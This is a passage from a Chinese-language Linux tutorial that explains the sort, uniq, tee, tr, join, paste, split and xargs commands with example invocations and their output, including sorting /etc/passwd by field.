class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">12</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>使用数字排序：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | sort -t <span class="string">&#x27;:&#x27;</span> -k <span class="number">3</span>n</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p>倒序排序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t <span class="string">&#x27;:&#x27;</span> -k 3nr</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">ntp:x:106:113::/home/ntp:/bin/false</span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t <span class="string">&#x27;:&#x27;</span> -k 3 -nr</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
<p>先以第六个域的第2个字符到第4个字符进行正向排序，再基于第一个域进行反向排序：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |  sort -t <span class="string">&#x27;:&#x27;</span> -k <span class="number">6.2</span>,<span class="number">6.4</span> -k <span class="number">1</span>r      </span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>
<p>查看/etc/passwd有多少个shell:</p>
<p>方法对/etc/passwd的第七个域排序并去重，然后统计行数：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># cat /etc/passwd |  sort -t&#x27;:&#x27; -k 7 -u</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">syslog:</span><span class="symbol">x:</span><span class="number">996</span><span class="symbol">:</span><span class="number">994</span><span class="symbol">:</span><span class="symbol">:/home/syslog</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:sync</span><span class="symbol">:/sbin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">halt:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:halt</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/halt</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">shutdown:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:shutdown</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/shutdown</span></span><br><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># cat /etc/passwd |  sort -t&#x27;:&#x27; -k 7 -u|wc -l</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<h4 id="uniq-去重">uniq - 去重</h4>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">选项与参数：</span><br><span class="line"><span class="deletion">-i   ：忽略大小写字符的不同；</span></span><br><span class="line"><span class="deletion">-c  ：进行计数</span></span><br><span class="line"><span class="deletion">-u  ：只显示唯一的行</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>该命令用于排完序之后，对排序结果进行去重</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span>@xxx:~$ last | cut -d <span class="string">&#x27; &#x27;</span> -f <span class="number">1</span>  | <span class="keyword">sort</span> | uniq</span><br><span class="line"></span><br><span class="line">haha</span><br><span class="line"><span class="keyword">python</span></span><br><span class="line">reboot</span><br><span class="line">wtmp</span><br><span class="line"><span class="keyword">python</span>@xxx:~$ last | cut -d <span class="string">&#x27; &#x27;</span> -f <span class="number">1</span>  | <span class="keyword">sort</span> | uniq -c</span><br><span class="line">      <span class="number">1</span> </span><br><span class="line">      <span class="number">2</span> haha</span><br><span class="line">     <span class="number">22</span> <span class="keyword">python</span></span><br><span class="line">      <span class="number">7</span> reboot</span><br><span class="line">      <span class="number">1</span> wtmp</span><br><span class="line"><span class="number">123456789101112</span></span><br></pre></td></tr></table></figure>
<p>排序文件，默认是去重：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> words | <span class="built_in">sort</span> |<span class="built_in">uniq</span></span></span><br><span class="line">friend</span><br><span class="line">hello</span><br><span class="line">world</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>排序之后删除了重复行，同时在行首位置输出该行重复的次数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -c</span></span><br><span class="line">1 friend</span><br><span class="line">3 hello</span><br><span class="line">2 world</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>仅显示存在重复的行，并在行首显示该行重复的次数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -dc</span></span><br><span class="line">3 hello</span><br><span class="line">2 world</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>仅显示不重复的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -u</span><br><span class="line">friend</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<h4 id="tee-同时输出多个文件">tee - 同时输出多个文件</h4>
<p>从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。</p>
<p>一般情况下用重定向实现，需要同时输出多个文件时可以使用该命令。</p>
<p><strong>参数</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a或–append 　附加到既有文件的后面，而非覆盖它．</p>
</li>
</ul>
<p>将输出同时保存到多个文件中，同时将输出内容显示到控制台：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>echo <span class="string">&quot;hello world&quot;</span>|tee f1 f2 </span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat f1</span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>echo <span class="string">&quot;hello world&quot;</span>|tee f1 f2 -a</span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat f1</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<h4 id="tr-替换指定的字符">tr - 替换指定的字符</h4>
<p>不指定参数时，即表示替换指定的字符为另一个字符，支持指定的字符集合。</p>
<p><strong>参数说明：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-d, --delete：删除指定的字符</p>
</li>
<li class="lvl-2">
<p>-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</p>
</li>
</ul>
<p>字符集合的范围：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)</p>
</li>
<li class="lvl-2">
<p>\ 反斜杠</p>
</li>
<li class="lvl-2">
<p>\a Ctrl-G 铃声</p>
</li>
<li class="lvl-2">
<p>\b Ctrl-H 退格符</p>
</li>
<li class="lvl-2">
<p>\f Ctrl-L 走行换页</p>
</li>
<li class="lvl-2">
<p>\n Ctrl-J 新行</p>
</li>
<li class="lvl-2">
<p>\r Ctrl-M 回车</p>
</li>
<li class="lvl-2">
<p>\t Ctrl-I tab键</p>
</li>
<li class="lvl-2">
<p>\v Ctrl-X 水平制表符</p>
</li>
<li class="lvl-2">
<p>CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</p>
</li>
<li class="lvl-2">
<p>[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止</p>
</li>
<li class="lvl-2">
<p>[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)</p>
</li>
<li class="lvl-2">
<p>[:alnum:] ：所有字母字符与数字</p>
</li>
<li class="lvl-2">
<p>[:alpha:] ：所有字母字符</p>
</li>
<li class="lvl-2">
<p>[:blank:] ：所有水平空格</p>
</li>
<li class="lvl-2">
<p>[:cntrl:] ：所有控制字符</p>
</li>
<li class="lvl-2">
<p>[:digit:] ：所有数字</p>
</li>
<li class="lvl-2">
<p>[:graph:] ：所有可打印的字符(不包含空格符)</p>
</li>
<li class="lvl-2">
<p>[:lower:] ：所有小写字母</p>
</li>
<li class="lvl-2">
<p>[:print:] ：所有可打印的字符(包含空格符)</p>
</li>
<li class="lvl-2">
<p>[:punct:] ：所有标点字符</p>
</li>
<li class="lvl-2">
<p>[:space:] ：所有水平与垂直空格符</p>
</li>
<li class="lvl-2">
<p>[:upper:] ：所有大写字母</p>
</li>
<li class="lvl-2">
<p>[:xdigit:] ：所有 16 进位制的数字</p>
</li>
<li class="lvl-2">
<p>[=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)</p>
</li>
</ul>
<p>将文件testfile中的小写字母全部转换成大写字母：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">testfile</span> |<span class="selector-tag">tr</span> <span class="selector-tag">a</span><span class="selector-tag">-z</span> <span class="selector-tag">A</span><span class="selector-tag">-Z</span> </span><br><span class="line">或</span><br><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">testfile</span> |<span class="selector-tag">tr</span> <span class="selector-attr">[:lower:]</span> <span class="selector-attr">[:upper:]</span> </span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>缩减连续重复的字符成指定的单个字符：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t</span><br><span class="line">dddddddsssssdd</span><br><span class="line">eeeeeeeeee</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line">vvvvvvvvvvvvvv</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -s <span class="string">&#x27;se&#x27;</span></span><br><span class="line">dddddddsdd</span><br><span class="line">e</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line">vvvvvvvvvvvvvv</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -s <span class="string">&#x27;sdeav&#x27;</span></span><br><span class="line">dsd</span><br><span class="line">e</span><br><span class="line">a</span><br><span class="line">v</span><br><span class="line"><span class="number">123456789101112131415</span></span><br></pre></td></tr></table></figure>
<p>删除指定的字符：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -d <span class="string">&#x27;dv&#x27;</span></span><br><span class="line">sssss</span><br><span class="line">eeeeeeeeee</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h4 id="join-文件按行连接">join - 文件按行连接</h4>
<p>将两个文件中指定栏位相同的行连接起来。即按照两个文件中共同拥有的某一列，将对应的行拼接成一行。</p>
<p>注意：在使用join之前所处理的文件要事先经过排序。</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ cat testfile_1</span><br><span class="line">Hello 95 #例如，本例中第一列为姓名，第二列为数额  </span><br><span class="line">Linux 85  </span><br><span class="line"><span class="keyword">test </span>30  </span><br><span class="line">cmd@hdd-desktop:~$ cat testfile_2</span><br><span class="line">Hello 2005 #例如，本例中第一列为姓名，第二列为年份  </span><br><span class="line">Linux 2009  </span><br><span class="line"><span class="keyword">test </span>2006 </span><br><span class="line">12345678</span><br></pre></td></tr></table></figure>
<p>使用join命令，将两个文件连接：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ join testfile_1 testfile_2 #连接testfile_1、testfile_2中的内容  </span><br><span class="line">Hello 95 2005 #连接后显示的内容  </span><br><span class="line">Linux 85 2009  </span><br><span class="line"><span class="keyword">test </span>30 2006 </span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>两个文件互换，输出结果的变化：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ join testfile_2 testfile_1 #改变文件顺序连接两个文件  </span><br><span class="line">Hello 2005 95 #连接后显示的内容  </span><br><span class="line">Linux 2009 85  </span><br><span class="line"><span class="keyword">test </span>2006 30 </span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a&lt;1或2&gt; 除了显示原来的输出内容之外，还显示指令文件中没有相同栏位的行。</p>
</li>
<li class="lvl-2">
<p>-e&lt;字符串&gt; 若[文件1]与[文件2]中找不到指定的栏位，则在输出中填入选项中的字符串。</p>
</li>
<li class="lvl-2">
<p>-i或–igore-case 比较栏位内容时，忽略大小写的差异。</p>
</li>
<li class="lvl-2">
<p>-o&lt;格式&gt; 按照指定的格式来显示结果。</p>
</li>
<li class="lvl-2">
<p>-t&lt;字符&gt; 使用栏位的分隔字符。</p>
</li>
<li class="lvl-2">
<p>-v&lt;1或2&gt; 跟-a相同，但是只显示文件中没有相同栏位的行。</p>
</li>
<li class="lvl-2">
<p>-1&lt;栏位&gt; 连接[文件1]指定的栏位。</p>
</li>
<li class="lvl-2">
<p>-2&lt;栏位&gt; 连接[文件2]指定的栏位。</p>
</li>
</ul>
<h4 id="paste-将多个文件对应行链接在一起">paste-将多个文件对应行链接在一起</h4>
<p>paste 指令会把每个文件以列对列的方式，一列列地加以合并。</p>
<p>语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">paste <span class="selector-attr">[-s]</span><span class="selector-attr">[-d &lt;间隔字符&gt;]</span><span class="selector-attr">[文件...]</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>参数</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-d&lt;间隔字符&gt;或–delimiters=&lt;间隔字符&gt; 　用指定的间隔字符取代跳格字符。</p>
</li>
<li class="lvl-2">
<p>-s或–serial 　串列进行而非平行处理。</p>
</li>
<li class="lvl-2">
<p>[文件…] 指定操作的文件路径</p>
</li>
</ul>
<p>使用paste指令将文件&quot;file&quot;、“testfile”、&quot;testfile1&quot;进行合并，输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file                  <span class="comment">#file文件的内容</span></span>  </span><br><span class="line">xiongdan 200  </span><br><span class="line">lihaihui 233  </span><br><span class="line">lymlrl 231  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> testfile              <span class="comment">#testfile文件的内容</span></span>  </span><br><span class="line">liangyuanm  ss  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> testfile1             <span class="comment">#testfile1文件的内容</span></span>  </span><br><span class="line">huanggai 56  </span><br><span class="line">zhixi 73 </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">paste</span> file testfile testfile1</span></span><br><span class="line">xiongdan 200    liangyuanm ss   huanggai 56</span><br><span class="line">lihaihui 233            zhixi 73</span><br><span class="line">lymlrl 231</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">paste</span> -d <span class="string">&#x27;:&#x27;</span> file testfile testfile1</span></span><br><span class="line">xiongdan 200:liangyuanm ss:huanggai 56</span><br><span class="line">lihaihui 233::zhixi 73</span><br><span class="line">lymlrl 231::</span><br><span class="line">1234567891011121314151617</span><br></pre></td></tr></table></figure>
<p>参数&quot;-s&quot;可以将一个文件中的多行数据合并为一行进行显示：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">$ paste -s file             <span class="comment">#合并指定文件的多行数据</span></span><br><span class="line">xiongdan<span class="number"> 200 </span>lihaihui<span class="number"> 233 </span>lymlrl<span class="number"> 231 </span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>如果将文件位置改为-，表示接收标准输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file |<span class="built_in">paste</span> testfile1 -</span></span><br><span class="line">huanggai 56     xiongdan 200</span><br><span class="line">zhixi 73        lihaihui 233</span><br><span class="line">        lymlrl 231</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<h4 id="split-文件切割">split - 文件切割</h4>
<p>split命令用于将一个文件分割成数个。</p>
<p>该指令将大文件分割成较小的文件，在默认情况下将按照每1000行切割成一个小文件。</p>
<p>语法：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">split [-<span class="keyword">bl] </span>file <span class="keyword">prefix</span></span><br><span class="line"><span class="keyword"></span>-<span class="keyword">b: </span>以大小切割</span><br><span class="line">-l：以行数切割</span><br><span class="line"><span class="keyword">prefix：切割后文件的前缀</span></span><br><span class="line"><span class="keyword"></span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-&lt;行数&gt; : 指定每多少行切成一个小文件</p>
</li>
<li class="lvl-2">
<p>-b&lt;字节&gt; : 指定每多少字节切成一个小文件</p>
</li>
<li class="lvl-2">
<p>-C&lt;字节&gt; : 与参数&quot;-b&quot;相似，但是在切 割时将尽量维持每行的完整性</p>
</li>
<li class="lvl-2">
<p>[输出文件名] : 设置切割后文件的前置文件名， split会自动在前置文件名后再加上编号</p>
</li>
</ul>
<p>使用指令&quot;split&quot;将文件&quot;README&quot;每6行切割成一个文件，输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">split</span> -6 README       <span class="comment">#将README文件每六行分割成一个文件</span></span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span>                                <span class="comment">#执行ls指令</span></span>  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获得当前目录结构</span></span><br><span class="line">README xaa xad xag xab xae xah xac xaf xai</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>以上命令执行后，指令&quot;split&quot;会将原来的大文件&quot;README&quot;切割成多个以&quot;x&quot;开头的小文件。而在这些小文件中，每个文件都只有6行内容。</p>
<p>以大小切割：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">$ ls -<span class="keyword">lh </span><span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>-rwxr-xr-x <span class="number">1</span> root root <span class="number">122</span>M <span class="keyword">Jul </span> <span class="number">4</span>  <span class="number">2013</span> <span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>$ split -<span class="keyword">b </span><span class="number">50</span>m <span class="keyword">disease.dmp </span><span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>$ ls -<span class="keyword">lh </span><span class="keyword">disease.dmp*</span></span><br><span class="line"><span class="keyword"></span>-rwxr-xr-x <span class="number">1</span> root root <span class="number">122</span>M <span class="keyword">Jul </span> <span class="number">4</span>  <span class="number">2013</span> <span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">50</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpaa</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">50</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpab</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">22</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpac</span></span><br><span class="line"><span class="keyword"></span><span class="number">12345678</span></span><br></pre></td></tr></table></figure>
<h4 id="xargs-参数代换">xargs - 参数代换</h4>
<p>不是所有的命令都支持管道，如ls，对于不支持管道的命令，可以通过xargs让其有管道命令的效果，如下所示：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find /sbin -perm +7000 | xargs ls -l</span></span><br><span class="line">-rwsr-x---<span class="number"> 1 </span>root ecryptfs<span class="number"> 19896 </span>Feb<span class="number"> 23 </span><span class="number"> 2012 </span>/sbin/mount.ecryptfs_private</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75496 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/mount.nfs</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/mount.nfs4</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root root     <span class="number"> 8544 </span>Feb<span class="number"> 22 </span><span class="number"> 2012 </span>/sbin/netreport</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 14112 </span>Nov <span class="number"> 2 </span><span class="number"> 2010 </span>/sbin/pam_timestamp_check</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/umount.nfs</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/umount.nfs4</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 19768 </span>Nov <span class="number"> 2 </span><span class="number"> 2010 </span>/sbin/unix_chkpwd</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure>
<p>如果没有xargs，ls -l的结果将不是前面find的标准输出，因为ls不支持管道命令。</p>
<p>xargs 用作替换工具，读取输入数据重新格式化后输出。</p>
<p>定义一个测试文件，内有多行文本数据：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># cat test<span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> c d e f <span class="selector-tag">g</span></span><br><span class="line">h <span class="selector-tag">i</span> j k l m n</span><br><span class="line">o <span class="selector-tag">p</span> <span class="selector-tag">q</span></span><br><span class="line"><span class="attribute">r</span> s t</span><br><span class="line">u v w <span class="attribute">x</span> <span class="attribute">y</span> z</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>多行输入单行输出：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">cat</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> | <span class="selector-tag">xargs</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> <span class="selector-tag">c</span> <span class="selector-tag">d</span> <span class="selector-tag">e</span> <span class="selector-tag">f</span> <span class="selector-tag">g</span> <span class="selector-tag">h</span> <span class="selector-tag">i</span> <span class="selector-tag">j</span> <span class="selector-tag">k</span> <span class="selector-tag">l</span> <span class="selector-tag">m</span> <span class="selector-tag">n</span> <span class="selector-tag">o</span> <span class="selector-tag">p</span> <span class="selector-tag">q</span> <span class="selector-tag">r</span> <span class="selector-tag">s</span> <span class="selector-tag">t</span> <span class="selector-tag">u</span> <span class="selector-tag">v</span> <span class="selector-tag">w</span> <span class="selector-tag">x</span> <span class="selector-tag">y</span> <span class="selector-tag">z</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>-n 选项多行输出：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">cat</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> | <span class="selector-tag">xargs</span> <span class="selector-tag">-n3</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> <span class="selector-tag">c</span></span><br><span class="line"><span class="selector-tag">d</span> <span class="selector-tag">e</span> <span class="selector-tag">f</span></span><br><span class="line"><span class="selector-tag">g</span> <span class="selector-tag">h</span> <span class="selector-tag">i</span></span><br><span class="line"><span class="selector-tag">j</span> <span class="selector-tag">k</span> <span class="selector-tag">l</span></span><br><span class="line"><span class="selector-tag">m</span> <span class="selector-tag">n</span> <span class="selector-tag">o</span></span><br><span class="line"><span class="selector-tag">p</span> <span class="selector-tag">q</span> <span class="selector-tag">r</span></span><br><span class="line"><span class="selector-tag">s</span> <span class="selector-tag">t</span> <span class="selector-tag">u</span></span><br><span class="line"><span class="selector-tag">v</span> <span class="selector-tag">w</span> <span class="selector-tag">x</span></span><br><span class="line"><span class="selector-tag">y</span> <span class="selector-tag">z</span></span><br><span class="line"><span class="number">12345678910</span></span><br></pre></td></tr></table></figure>
<p>-d 选项可以自定义一个定界符：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta"># echo <span class="string">&quot;nameXnameXnameXname&quot;</span> | xargs -dX</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span> <span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>结合 -n 选项使用：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta"># echo <span class="string">&quot;nameXnameXnameXname&quot;</span> | xargs -dX -n2</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>读取 stdin，将格式化后的参数传递给命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> sk.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sk.sh命令内容，打印出所有参数。</span></span><br><span class="line">echo $*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> arg.txt</span></span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> arg.txt | xargs -I &#123;&#125; ./sk.sh -p &#123;&#125; -l</span></span><br><span class="line">-p aaa -l</span><br><span class="line">-p bbb -l</span><br><span class="line">-p ccc -l</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure>
<p>选项<code>-I</code>指定一个替换字符串 {}，这个字符串在 xargs 扩展时会被替换掉。</p>
<p>复制所有图片文件到 /data/images 目录下：</p>
